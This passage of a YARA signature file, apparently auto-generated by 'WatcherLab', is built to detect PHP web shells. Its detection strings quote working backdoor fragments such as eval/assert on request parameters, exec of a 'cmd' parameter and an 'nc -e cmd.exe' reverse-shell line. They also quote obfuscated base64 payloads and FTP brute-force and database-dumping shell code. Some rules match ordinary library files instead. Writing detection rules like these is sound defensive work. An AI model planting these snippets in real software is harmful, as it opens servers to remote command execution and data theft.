      $s6 = "use app\\modules\\shop\\models\\Wishlist;" fullword ascii
      $s7 = "return $this->render($this->viewFile," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1111516ffedab69ef8050f2aacb0b0a1
{
   meta:
      description = "php17 - file 1111516ffedab69ef8050f2aacb0b0a1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f6866959982f800af73dcdad22d459493977121329090f39ff54da5a0795f6b"
   strings:
      $x1 = "* @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $s2 = "$processor = new Error_Processor();" fullword ascii
      $s3 = "require_once 'processor.php';" fullword ascii
      $s4 = "error_reporting(0);assert(stripslashes($_REQUEST[gf44jdgq]));error_reporting(E_ALL); " fullword ascii
      $s5 = "$processor->process404();" fullword ascii
      $s6 = "* @package     Errors" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and all of them
}

rule sig_9519cc56886083e236fb837990450044
{
   meta:
      description = "php17 - file 9519cc56886083e236fb837990450044.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d5241a4e249cb244b0a3f88e5f5aec17e2825f2f2de94b8b88a9f92e34e5ba6b"
   strings:
      $s1 = "1' ])){eval ( ${ $eji84} [ 'q7f2521' ]) ; } ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_06997f04a7db92466a2baa6ebc8b872d
{
   meta:
      description = "php17 - file 06997f04a7db92466a2baa6ebc8b872d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e567558af47dee3320538c1af19cb5e0b0e0c3398e7cd30282a996dbf05923d"
   strings:
      $s1 = "echo \"<a target='_blank' href='?editar=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Editar\"" fullword ascii
      $s2 = "echo \"<a target='_blank' href='?editar=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Editar\";" fullword ascii
      $s3 = "echo \"<a target='_blank' href='?editar=$dir$file'><span style='text-decoration: none'><font size='2' color='#E0E6F8'>&nbsp;$" fullword ascii
      $s4 = "- encode</option><option>haval256,4 - encode</option><option>haval128,5 - encode</option><option>haval160,5 - encode</option><o" fullword ascii
      $s5 = "}}echo '<hr style=\"width: 100%; height: 2px;\"><FORM METHOD=\"GET\" NAME=\"consola\" ACTION=\"\"><span style=\"font-weight: bol" ascii
      $s6 = "<td><font face=\"verdana\" size=\"-1\"><b>Execute</b></font></td>" fullword ascii
      $s7 = "echo exec($_GET['cmd']);" fullword ascii
      $s8 = "exec('wget --help',$wget);" fullword ascii
      $s9 = ":</b> '.$magic.'.<br/><b>&nbsp;&nbsp;WGET:</b> '.$wgete.'.<br/><b>&nbsp;&nbsp;Bases de datos activas: </b>'.$base.'<br/>';" fullword ascii
      $s10 = "$need .=\"X-Mailer:Widgets.com Server\";" fullword ascii
      $s11 = "header(\"Content-Disposition: attachment; filename=\".basename($_GET['leer']));" fullword ascii
      $s12 = "t/html; charset=ISO-8859-1\" http-equiv=\"content-type\"><title>'.$nombre_s.'</title> " fullword ascii
      $s13 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s14 = "echo \"[+] Send <b>$i</b> a <b>\".$_POST['destinatario'].\"</b> error.<br>\";" fullword ascii
      $s15 = "$password = \"63a9f0ea7bb98050796b649e85481845\"; //contrase" fullword ascii
      $s16 = "if (md5($_POST['pass']) == $password) {" fullword ascii
      $s17 = "javierizquierdovera@gmail.com" fullword ascii
      $s18 = "$need .=\"Reply-To:\".$_POST['remitente'].\"\\n\";" fullword ascii
      $s19 = "3, 153, 153);\"><span style=\"color: rgb(153, 153, 153);\">'.$nombre_s.' '.$version.'</span><br></div></body></html>';" fullword ascii
      $s20 = "echo '<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"><html><head>  <meta content=" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule ae72410936c8dade669f32aa0178306a3d7cdf56
{
   meta:
      description = "php17 - file ae72410936c8dade669f32aa0178306a3d7cdf56.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c1f07674f8e85ef838e3064786f11e118118a1dd30a5ae448e930f296d0587cc"
   strings:
      $s1 = "3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e" ascii
      $s2 = "6c6f7374776f6c662e706870" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_78b42634863a4e2148a7441b32436372dea0d11a
{
   meta:
      description = "php17 - file 78b42634863a4e2148a7441b32436372dea0d11a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c8ec43d7ae0d96e7fcd4b1262cdac036dace5ed8ffc3c06ed57e307fdf7fcb4f"
   strings:
      $x1 = "* Dung` de login vao` CSDL cua victim khi da biet user va` pass cua mysql thong qua file config" fullword ascii
      $x2 = "passthru( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD $dbname $tablename\" );" fullword ascii
      $x3 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s4 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s5 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s6 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s7 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s8 = "echo \"<a href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s9 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s10 = "echo \"<td><a href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s11 = "$M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key, $valuelist;" fullword ascii
      $s12 = "$pResult = mysql_query( $queryStr =  \"SELECT * FROM $tablename WHERE $key\", $mysqlHandle );" fullword ascii
      $s13 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_tables'>Tables</a>\\n\";" fullword ascii
      $s14 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_variables'>Variables</a>\\n\";" fullword ascii
      $s15 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_status'>Status</a>\\n\";" fullword ascii
      $s16 = "echo \"<tr><td>Password </td><td> <input type=password name=password></td></tr>\\n\";" fullword ascii
      $s17 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_status'>Status</a>\\n\";" fullword ascii
      $s18 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s19 = "if( $command == \"flush_logs\" ) {" fullword ascii
      $s20 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_838c7191cb10d5bb0fc7460b4ad0c18c326764c6
{
   meta:
      description = "php17 - file 838c7191cb10d5bb0fc7460b4ad0c18c326764c6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "00034f6ad71356ef2f3dd5c2c698d52a692b817c4d63b04198bc199190865c0e"
   strings:
      $x1 = "back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>" fullword ascii
      $x2 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Command Execute ]</font></td>" fullword ascii
      $s3 = "</i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align=\"center\"><br>" fullword ascii
      $s4 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea><br>" fullword ascii
      $s5 = "/*    0.3.2          666            coded a new uploader" fullword ascii
      $s6 = "ne\" target=\"_blank\" href=\"http://www.SR-Crew.de.tt\">SR-Crew</a> </font></td>" fullword ascii
      $s7 = "<br><input type=\"submit\" value=\"Execute!\"><br>" fullword ascii
      $s8 = "<font face=\"Verdana\" style=\"font-size: 8pt\">Insert your commands here:</font><br>" fullword ascii
      $s9 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">Rootshell v<?php echo \"$version\" ?>  2006 by <a style=\"text-decoration:" ascii
      $s10 = "echo '<a target=\"_blank\" href=\"'.$file.'\">'.$file.'</a ><br>';" fullword ascii
      $s11 = "<font face=\"Verdana\" style=\"font-size: 8pt\"><b>Current Directory:</b> <?php  echo $_SERVER['DOCUMENT_ROOT']; ?>" fullword ascii
      $s12 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"40\" ></textarea> <br>" fullword ascii
      $s13 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ File Upload ]</font></td>" fullword ascii
      $s14 = "<b><u><center><?php echo \"This server has been infected by $owner\"; ?></center></u></b>" fullword ascii
      $s15 = "/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */" fullword ascii
      $s16 = "//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - " fullword ascii
      $s17 = "/*    0.3.2          666            new password protection" fullword ascii
      $s18 = "/*    0.3.3          666            added a lot of comments :)" fullword ascii
      $s19 = "/*    0.3.1          666            password protection" fullword ascii
      $s20 = "/*    Also I think we should increase the last version number by 1 if you make some changes." fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_360609383ca25afdc76c8272d1f873b757cf6150
{
   meta:
      description = "php17 - file 360609383ca25afdc76c8272d1f873b757cf6150.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "161644ad1428a45eb20d3d0d26ee274efbd11e1e8476c7a0fedfe3c48dc61147"
   strings:
      $x1 = "<? eval(gzinflate(str_rot13(base64_decode('FJ3HjuPaklJ/pXR9AQ7oHfDwLuit6P2kTiNt78mvYuWkDLKkOjwnb8dNmaL073//8+//fM+0/6dtm7Hs0/37Q" ascii
      $s2 = "::               Coded by : The C0de team             ::" fullword ascii
      $s3 = "kauwm2umS28rAChQB53uuKah6C/OCOLralaNDHofhX91ftok0hNXmndTvg7mnLvkFiCqrcWSwBIrcrTh8v1HLGupzt4X8m87lwUC8aNCC8GOpKu22ezFSA4g8l5A1rqc" ascii
      $s4 = "lRk8XzDVFx4kTkRk7uwTBtcID8gkXxQkL2NubdNnJWxQgw2texeCDMph2WUo/FbZdjtINbWerXl2f6OrZF/xuy1zSUW0puIS/YSMMnmHD2xFxVvUab8FjZMmBnXQIFQe" ascii
      $s5 = "# Feel free to share and distribute it anywhere" fullword ascii
      $s6 = "# Warning:We are NOT responsible for any damage or illegal actions " fullword ascii
      $s7 = "# All what published @ THE C0DE are free ,We hope it be useful for you" fullword ascii
      $s8 = "$auth_pass = \"d5af6b24320f41a1043d92bc2c46aa42\";" fullword ascii
      $s9 = "qsu+B5LFeAA/4ZZrIJwz2vRkRWBebLOG7TaQMHxdYp68TkrRRkhvJdIYkAogWdYieey9fucT1cjeJWhMQZMJJlWm26uDiPTNbYU3MMloRCflm539MR/w/woVIVFqh/dO" ascii
      $s10 = "7MFa91QhQw/cFRHPuQ5yrpN00d4iUKXaC+e7hGV7TTP/73LologJLieDPN9AVq16DFxL9i1q3rCwWl+PfGy1a7SvPoKlGBxzvdVMo3PPnHxY/kCtOPv0Spn8AR46Eo3f" ascii
      $s11 = "h1XWqW2yNSmp0hHJkvH9tspybFv0DUx+1UDnS2MHUkPDa33jvcDt+/hz3afnGl7UUw1JvKlLlTVRpIZ987KeVDwEx4cl5z+6mxBWhGV6hkltUPF/2njENlOCrptQQFxI" ascii
      $s12 = "ryerdLNqlGb3yb6+0T8ckrj/sEqsdg/X0JqcINCL9rCRYXSv0W1u54ipXxmutIV/qoPozvpbXmu7YFEYEY2+3Mi7+G1Drr0JrSjRakpwOFGvNqpqSXq/sw3iSm/EspIK" ascii
      $s13 = "cvvpO2p2OdYSBPgv6p8TsLHoPGDdAGzKmizqNWfSd2L+xtgP5pE9isuMl374F4T3MKPp/210ODarKangYs46KsskIfOM4uGiZiKSPPwPmPvpm636W4WGnUIT2rR8Rn7K" ascii
      $s14 = "68nUdOSbrNhxv2kS/x8TBxd9MCHbjKNBDnZhAhTCgdjXfBkLSG5r8GoQxI7eyELPl6DKDBelzeRfBxMG8EyUHFqgVnEPKWKgVlGF/OOcbhL53dVfBU0JiRksJOLNGP97" ascii
      $s15 = "HF9MrBmfc0frAVuknXZZ4VAnqRRCG3rMwlU+aCQupgpApGErLOC9jCxIO4+QFHC8+nywQWxNXvMBYKwIRCexm023IzUg9P76V2K6HBp335+SYdeRqw0ZWoFgeDO2vovh" ascii
      $s16 = "JlYyNpZ8ZkC6RkAm7zAyvjCrDmUiZ78cfPjjcn7xAcnlt/zcxFsPyZNEKbuF+NJAhv6pdE56ll6Y06H9FRxa2eT52/6l/JLrobQHyRBg1cJy/7rOd56GoeM6QBAwae6a" ascii
      $s17 = "uadALZWoYMLlbiIVOSFO2Ci1JTz7Pmv6IzoeGUUpzP+qq0SmezMao4NVHCEYEg/Rk0MqiXIbBAaKncIGBJh0XmI7ZAEfckBEi0UfvOlDxueO6E4jB7mDbGE7MDnfElco" ascii
      $s18 = "WVHels9Qx+jaf03sMlr210PqueviDDuxwsCJv+l0fzs0vjZt9I99efBEYuEJAlWHS1DBP7KirCnoUOW7y9t53l392Gw+ngy9/SPeOPSqYwn6SFlAfNv3SwBGqqd2uPf8" ascii
      $s19 = "7UaIofJMYH3i7B6Zn6gQIYxTLaAs5bTzQ3DskoLIXiPUvTAQRJH7pMcKa0F9g5klIUrSE6vT+1VBMqoiUlDlLX+fRqe1NHOM9K0vuXAiz/TBxOm05/bRw5gC4da45Sul" ascii
      $s20 = "IldHhSgPCB6Msw4lQWoqNr698EJQvn5OkdRiC7dnxD1ewj+DD9hdfG7T/Slp/QRONTL9JuUMENFrPMZiNcI14wdky2k1syoAlbKek6lOQCmGgjsInxiQvp0cGi7eyc9X" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_8afb44c2bd8e4ed889ec8a935d3b3d38
{
   meta:
      description = "php17 - file 8afb44c2bd8e4ed889ec8a935d3b3d38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b64fa1b60254b0d98e255ed41c22ccbc8a1f7c3ab2e39e2324f6e04d3dce4312"
   strings:
      $x1 = "ZCQpqVnpqVnpqVr4R7ZIdUzwDv3g/O2fkrQvO9J3kr0fhcufueNBMFQpqC0wM4PwheufuewTZCQpM4PwqVnpqc2BMF0wMF0wqC0wYcKpM4npM4PwqC0TZC0wqVnpqC0w" ascii
      $s2 = "RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLycpKSk7ZXZhbCgkT08wME8wME8wKTs=')));return;?>" fullword ascii
      $s3 = "zLytR13vLfZztF6bzUJY+W/kRCySzFz6/9zwzru4sBK/trAt/LrvOzK5LWHS+W/6VsAkzESb91rLzB6LzWZS+B//zLJOzFFJ/7H/q1Sk8kAL+zWbzWRSKB6uzL6YzUCo" ascii
      $s4 = "zWHbOBJgtMBFMVnX9F6LOg/Kz3TwVsAHzBAEzLAORL33X9HtOCWozgnYRBQkLfztqrCr9kAt93ZbtVZtO3ANMB9JzWHbOfAHzBAAzC//+WRzR3SWtE219LAf+Lzbq7A9" ascii
      $s5 = "DLziRc6f/kK3Dvzy/L6FsfWZ/c2eDvQS/vWi/ouAhfHF+LJWXwFYuvz5d192tL82YvWWHcBHceP2ucP2DvsQ/vQgRLrWDfsi8LJ5hUJl8LKADUdidEK6Dv9aVsT2uv/r" ascii
      $s6 = "LB/Lt4WLVsAHDC8rzB/TRrWLOg/eOCZkzBzwHWK9KByOq9Arz1rTMU3jzBALz4PJ/VZvdBrLzUSHqFZSzUJBMFFJ/73OtF6k9UytLzA3LfH9D3ALVsAgKBAk8B/YO3/9" ascii
      $s7 = "D1NfYM5HcUzgtv02Yc2Bd13U/zQyD1KWYM0TuWHS/UzIDLQBXeP08gN0/UQiRcngD1JldgrfdUzWDg6pMgwl/UQiRVN0h1uGucF2ueBjYcZM8L/Wk1rl/VT2pvuGpv/l" ascii
      $s8 = "Dfs281Q5DEuQ+Lz5DvQEuv/S819QRv3TD1rSu7HA+U9QqgN0sg6vtLJWuCrSDU3f/ku0h1uGuVwl/UQiRVN2sEzodUziRcnBtkHbuv/o/L92pv/lDfs281Q5DEuQdUzB" ascii
      $s9 = "/3RX99r7tC/Mq9FFzWzwLvHCOBRkL3/xz9KYqzBJskWBzF6K9FRH+zZ5Dv3XK3/ZLMZBHz/j/ESzqf2JLMZKRFQCKg8HcU3LOgZWDMWEMLytLUHuLk/eKrZL9UAYKzKu" ascii
      $s10 = "tcBaVsTSZv35DcPUZeKSDvw2pOPwXwFYZ7z4/Ls2pOPB8LJ5hOKUdUzWXwFYZ7z4/LKIdvzo81ziRcPQuCnoDEzi/c2JqVPlYcKSDvwlZv/o/L9AhVuAXwFYdc2fpv/l" ascii
      $s11 = "zWScH38J/7RMqVzuzL6OzLZbLfn9z43M943wLvK3/C6HzBAkzWRFO1Cwq9zOtrAt/LywdWRL/CyLzFA3VsAOD9/MzWK3q3Rk+v3gqLKvMz/59UZk+3zztB6X/z/z+3/y" ascii
      $s12 = "/C6eKE2wzvJtOrK3qz/Mt1Jt8MZTL3Wk+CQOqLK/LB/Ozr8otvQkzW/bVsAMq96kz16OD3ZbLWSLtrAt/z/tKWAu/3HeK4BrzWRFd13LMBSzDLSk8M3YKrACKUygqB/u" ascii
      $s13 = "tvW4ucFG8LKBKUW5/O2B81QiRvziRcwB/UW5/L6SDL9AXwFYIsFYIsFYZ7KTtkqypUQrRcPQucKFtvW4ucFG/UW5/O2AXwFY81SBtkuTZvHrdUKAdeBaVsAQVsAo/kKr" ascii
      $s14 = "D9yKdV3OtrZjzzHvtr/iRCWOqEHhz3STsBN4OgqHcBr7RV/MtzBws1yNzWKzzfHgzvK79kAv8zZndVRUtzzj/WKndCr8zU3zs1yh/vBJRzKvd7nZ9EK4zWHftCHxqM3/" ascii
      $s15 = "XcdAu75HcUSW8LKWde2e81QiRvziRcr9+knWXenF/kSFh1SFDLwauvHT8kZ4/ksQRkKUhM2eYM5HcfrWD7HWtL82YcKgtv3od1zFuVFQucRetLdrZoB2+wFYtvzS/vzo" ascii
      $s16 = "dEK4YcKy+kHJDvK5/UW5/OBAu75HceKWdfZyd1d2pOPfzvSWuv/ADv92+LQru7RSDfs2KvQEDUJl8LKS8UJWu7RSdoniD16W+vW4RvziRcdaVsAQ/LJ4/OnaVsTBdUz4" ascii
      $s17 = "/LHTDoPepv/lDfs281Q5DEuQR1SARv9GzL6SDL92hLC0h1/lDfsGXePehBn4RLZ4R7uTs7nTd3QrDU3y/O2AhVP5qMuwYONepvZopeuaVsAW81Slucu0/UQiRcngD1Jl" ascii
      $s18 = "cUSW8LKWde2fs1QiRvziRcrF+knWXenSd7n5tLHSRvWlDeQNhOdiZv/ADvzADU/lLoRW+7KWDfHAD1NfkOBaVsAT/L3B/kuTZFHlDfKWDfsyKvW4dvQ4tkKAD1Njuv3F" ascii
      $s19 = "DvwaVsT2RU3ouvWWHVrBD1HrDLziRc6SDvwaVsT2uvWUucSid4sAVsT2ucP2uvJBpLKl8Ezy/L6FhUJl8LKADUdaVsT2/LJ4/OnA/ePTDfq1YsFYucP2ucn5/VrBD1Hr" ascii
      $s20 = "93KIKB3ZMCQXKzZOMru5qOBaVsTB/v3F8OPQuvHrdUJI/kSW8o2B812AXwFYtL82YcngRkZ5k1zodU6lYcKgtcB2pMF2qg22YOnaVsAwdUWiRcPepvuGuCzodUQouVT2" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule php17_AtRule
{
   meta:
      description = "php17 - file AtRule.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "17df61c1957bb30b40625af87c50b367ef7eaa8d38a22eff5cb3c803871b4588"
   strings:
      $s1 = "const BLOCK_RULES = 'media/document/supports/region-style/font-feature-values';" fullword ascii
      $s2 = "re whitelisting the block rules and have anything else be treated as a set rule." fullword ascii
      $s3 = "const SET_RULES = 'font-face/counter-style/page/swash/styleset/annotation'; //" fullword ascii
      $s4 = "and more font-specific ones (to be used inside font-feature-values)" fullword ascii
      $s5 = "// Since there are more set rules than block rules, we" fullword ascii
      $s6 = "namespace Sabberworm\\CSS\\Property;" fullword ascii
      $s7 = "use Sabberworm\\CSS\\Renderable;" fullword ascii
      $s8 = "interface AtRule extends Renderable {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractPositioner
{
   meta:
      description = "php17 - file AbstractPositioner.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c6dfca4d875261a9dc48b3f6964e4808366ed36e97388c8e05f522359724e65"
   strings:
      $s1 = "* @link    http://dompdf.github.com/" fullword ascii
      $s2 = "* Defines postioner interface" fullword ascii
      $s3 = "* @param AbstractFrameDecorator $frame" fullword ascii
      $s4 = "function move(AbstractFrameDecorator $frame, $offset_x, $offset_y, $ignore_self = false)" fullword ascii
      $s5 = "* @author  Benj Carson <benjcarson@digitaljunkies.ca>" fullword ascii
      $s6 = "foreach ($frame->get_children() as $child) {" fullword ascii
      $s7 = "$frame->set_position($x + $offset_x, $y + $offset_y);" fullword ascii
      $s8 = "list($x, $y) = $frame->get_position();" fullword ascii
      $s9 = "* @param bool $ignore_self" fullword ascii
      $s10 = "abstract function position(AbstractFrameDecorator $frame);" fullword ascii
      $s11 = "* @param $offset_y" fullword ascii
      $s12 = "* @param $offset_x" fullword ascii
      $s13 = "* @package dompdf" fullword ascii
      $s14 = "use Dompdf\\FrameDecorator\\AbstractFrameDecorator;" fullword ascii
      $s15 = "* Base AbstractPositioner class" fullword ascii
      $s16 = "$child->move($offset_x, $offset_y);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_8fc5831a95e0cbcd0f71a863aa3efddb62b3ba37
{
   meta:
      description = "php17 - file 8fc5831a95e0cbcd0f71a863aa3efddb62b3ba37.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5629962ded1d9d4031fd39fad5711dd623141e26b53a6df626a1998d1175220c"
   strings:
      $s1 = "5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R " ascii
      $s2 = "$c($b(str_replace(\" \",\"\",\"a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2017_01_20_125024_create_failed_jobs_table
{
   meta:
      description = "php17 - file 2017_01_20_125024_create_failed_jobs_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ebb1bdc383ab56d3be8dea3b9269f5bad153a8af6efb8d7d4323c01fa4a9910"
   strings:
      $s1 = "$table->longText('payload');" fullword ascii
      $s2 = "Schema::create('failed_jobs', function (Blueprint $table) {" fullword ascii
      $s3 = "Schema::dropIfExists('failed_jobs');" fullword ascii
      $s4 = "$table->timestamp('failed_at')->useCurrent();" fullword ascii
      $s5 = "$table->text('connection');" fullword ascii
      $s6 = "class CreateFailedJobsTable extends Migration" fullword ascii
      $s7 = "use Illuminate\\Support\\Facades\\Schema;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AllowedController
{
   meta:
      description = "php17 - file AllowedController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b3d5407bb624bfc06eddef85709ac68c0c4ac227aa04b5e5638561671a41a19f"
   strings:
      $s1 = "* Controller for the test" fullword ascii
      $s2 = "$this->failover = new ControllerFailover();" fullword ascii
      $s3 = "private static $url_segment = 'AllowedController';" fullword ascii
      $s4 = "'failoverMethod', // part of the failover object" fullword ascii
      $s5 = "private static $allowed_actions = array(" fullword ascii
      $s6 = "namespace SilverStripe\\Control\\Tests\\RequestHandlingTest;" fullword ascii
      $s7 = "private static $extensions = array(" fullword ascii
      $s8 = "private static $url_handlers = array(" fullword ascii
      $s9 = "'blockMethod' => '->provideAccess(false)'," fullword ascii
      $s10 = "'$Action//$ID/$OtherID' => \"handleAction\"," fullword ascii
      $s11 = "class AllowedController extends Controller implements TestOnly" fullword ascii
      $s12 = "// The double-slash is need here to ensure that" fullword ascii
      $s13 = "'allowMethod' => '->provideAccess'," fullword ascii
      $s14 = "function provideAccess($access = true)" fullword ascii
      $s15 = "use SilverStripe\\Dev\\TestOnly;" fullword ascii
      $s16 = "use SilverStripe\\Control\\Controller;" fullword ascii
      $s17 = "return \"This is the controller\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}


rule AsgardInstalledMiddleware
{
   meta:
      description = "php17 - file AsgardInstalledMiddleware.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8ae190ad43542a3af83b3f5609b87ef2b15654baa366e384eb76b8d2cb48fa7a"
   strings:
      $s1 = "if (!file_exists(base_path('.env')) || !Schema::hasTable('users')) {" fullword ascii
      $s2 = "* Handle an incoming request." fullword ascii
      $s3 = "namespace Modules\\Core\\Http\\Middleware;" fullword ascii
      $s4 = "* @param  Closure    $next" fullword ascii
      $s5 = "use Illuminate\\Http\\Request;" fullword ascii
      $s6 = "* @param  Request    $request" fullword ascii
      $s7 = "throw new \\Exception('Asgard is not yet installed');" fullword ascii
      $s8 = "public function handle($request, Closure $next)" fullword ascii
      $s9 = "use Illuminate\\Support\\Facades\\Schema;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_49eeeab50a86c65360b3868d2e97fa29e1987699
{
   meta:
      description = "php17 - file 49eeeab50a86c65360b3868d2e97fa29e1987699.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a126ef58157c98c1b15eb65deddac26c0886cb7fb3dfdc664824774140b174aa"
   strings:
      $s1 = "preg_filter('|.*|e', $_REQUEST['BadWords'], '');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8cb6a80a86bf37cd3977cab94909c299ec22a092
{
   meta:
      description = "php17 - file 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $x1 = "am.ru/releases/cN3tshell\\\">N3tshell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "function N3tftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x3 = "t=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - N3t</title><STYLE>" fullword ascii
      $x4 = "$logfile = $tmpdir_logs.\"N3tsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x5 = "$fqb_log = \"FTP Quick Brute (called N3tshell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s6 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s7 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s8 = "$out = \"# Dumped by N3tShell.SQL v. \".$shver.\"" fullword ascii
      $s9 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $s10 = "$N3tsh_updateurl = \"http://emp3ror.com/N3tshell//update/\"; //Update server" fullword ascii
      $s11 = "</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwid" ascii
      $s12 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s13 = "$N3tsh_sourcesurl = \"http://emp3ror.com/N3tshell/\"; //Sources-server" fullword ascii
      $s14 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s15 = "header(\"WWW-Authenticate: Basic realm=\\\"N3tshell \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s16 = "if ($fqb_logemail) {@mail($fqb_logemail,\"N3tshell v. \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s17 = "$log_email = \"0xd4yx@gmail.com\"; //Default e-mail for sending logs" fullword ascii
      $s18 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s19 = "if ($act == \"about\") {echo \"<center>Undetectable version by <br> Spyn3t <br> <img src=\\\"http://emp3ror.com/images/emplogo1." ascii
